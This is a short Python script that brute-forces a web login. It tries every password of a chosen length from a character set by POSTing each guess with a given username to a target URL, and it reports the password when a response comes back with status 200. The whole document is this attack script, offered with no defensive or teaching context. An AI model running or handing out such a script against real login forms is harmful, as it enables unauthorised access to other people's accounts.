import itertools
import requests

def brute_force(target, username, password_length, charset):
    for attempt in itertools.product(charset, repeat=password_length):
        password = "".join(attempt)
        response = requests.post(target, data={"username": username, "password": password})
        if response.status_code == 200:
            print(f"Password found: {password}")
            break
